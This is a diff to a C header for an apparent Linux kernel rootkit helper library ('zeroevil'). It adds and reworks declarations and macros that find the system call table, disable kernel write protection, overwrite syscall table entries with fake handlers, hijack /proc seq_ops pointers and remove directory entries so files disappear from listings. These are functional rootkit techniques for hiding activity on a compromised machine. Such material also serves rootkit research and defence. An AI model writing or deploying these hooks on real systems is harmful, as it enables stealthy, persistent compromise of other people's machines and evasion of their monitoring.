@@ -19,8 +19,8 @@
 // If not, see <http://www.gnu.org/licenses/>.
 
 
-# ifndef _GU_ZHENGXIONG_LIB_H
-# define _GU_ZHENGXIONG_LIB_H
+# ifndef _GU_ZHENGXIONG_ZEROEVIL_H
+# define _GU_ZHENGXIONG_ZEROEVIL_H
 
 
 # ifndef CPP
@@ -33,10 +33,12 @@
 # include <linux/seq_file.h>
 // printk.
 # include <linux/printk.h>
-# endif
+# endif // CPP
 
 # include "structs.h"
 
+
+// Functions related to the system call table or dispatcher.
 
 unsigned long **
 get_sct(void);
@@ -44,6 +46,19 @@ get_sct(void);
 unsigned long **
 get_sct_via_sys_close(void);
 
+void *
+get_lstar_sct_addr(void);
+
+unsigned long **
+get_lstar_sct(void);
+
+int
+set_lstar_sct(u32 address);
+
+void *
+phys_to_virt_kern(phys_addr_t address);
+
+// Functions related to write protection.
 
 void
 disable_wp(void);
@@ -51,6 +66,7 @@ disable_wp(void);
 void
 enable_wp(void);
 
+// Helper functions that print some information.
 
 void
 print_process_list(void);
@@ -58,22 +74,34 @@ print_process_list(void);
 void
 print_module_list(void);
 
+// Functions that process linux_dirent.
 
+// TODO: Consider the name ``print_dents``?
 void
 print_dirent(struct linux_dirent *dirp, long total);
 
+// TODO: Consider the name ``remove_dirent`` or ``remove_dent``?
 long
 remove_dirent_entry(char *name,
                     struct linux_dirent *dirp, long total);
 
+// Miscellaneous helper functions.
 
+// TODO: Consider the name ``strjoin`` or ``join_str``?
 char *
 join_strings(const char *const *strings, const char *delim,
              char *buff, size_t count);
 
+// TODO: Consider the name ``print_hex``?
 void
 print_memory(void *addr, size_t count, const char *prompt);
 
+// TODO: Consider the name ``print_asc``?
+void
+print_ascii(void *addr, size_t count, const char *prompt);
+
+
+// Logging helpers.
 
 // INFO: ``fn`` is short for ``__func__``.
 # define fn_printk(level, fmt, ...)                     \
@@ -84,7 +112,6 @@ print_memory(void *addr, size_t count, const char *prompt);
     printk(level "%s.%s: " fmt,                        \
            THIS_MODULE->name, __func__, ##__VA_ARGS__)
 
-
 // INFO: I only use ``pr_alert`` at present.
 // TODO: When wanting more, e.g. ``pr_info``, I will add them.
 # define fn_alert(fmt, ...) \
@@ -94,18 +121,23 @@ print_memory(void *addr, size_t count, const char *prompt);
     fm_printk(KERN_ALERT, fmt, ##__VA_ARGS__)
 
 
-// TODO: These two macros depend on your variable naming,
-// which is inconvenient.
+// Hooking helpers for sys_call_table .
 
-# define HOOK_SYS_CALL_TABLE(name)                          \
-    do {                                                    \
-        real_##name = (void *)real_sys_call_table[__NR_##name];  \
-        real_sys_call_table[__NR_##name] = (void *)fake_##name;  \
+// INFO: These two macros depend on the your function naming.
+
+# define HOOK_SCT(sct, name)                    \
+    do {                                        \
+        real_##name = (void *)sct[__NR_##name]; \
+        sct[__NR_##name] = (void *)fake_##name; \
     } while (0)
 
-# define UNHOOK_SYS_CALL_TABLE(name)                    \
-    real_sys_call_table[__NR_##name] = (void *)real_##name
+# define UNHOOK_SCT(sct, name)                  \
+    sct[__NR_##name] = (void *)real_##name
 
+
+// Hooking helpers for file_op and the like.
+
+// TODO: Abstract filp_open.
 
 # define set_file_op(op, path, new, old)                            \
     do {                                                            \
@@ -141,15 +173,16 @@ print_memory(void *addr, size_t count, const char *prompt);
             fm_alert("Failed to open %s with error %ld.\n",     \
                      path, PTR_ERR(filp));                      \
             old = NULL;                                         \
+        } else {                                                \
+                                                                \
+            afinfo = PDE_DATA(filp->f_path.dentry->d_inode);    \
+            old = afinfo->seq_ops.op;                           \
+            fm_alert("Setting seq_op->" #op " from %p to %p.",  \
+                     old, new);                                 \
+            afinfo->seq_ops.op = new;                           \
+                                                                \
+            filp_close(filp, 0);                                \
         }                                                       \
-                                                                \
-        afinfo = PDE_DATA(filp->f_path.dentry->d_inode);        \
-        old = afinfo->seq_ops.op;                               \
-        fm_alert("Setting seq_op->" #op " from %p to %p.",      \
-                 old, new);                                     \
-        afinfo->seq_ops.op = new;                               \
-                                                                \
-        filp_close(filp, 0);                                    \
     } while (0)
 
 # define set_file_seq_op(opname, path, new, old)                    \
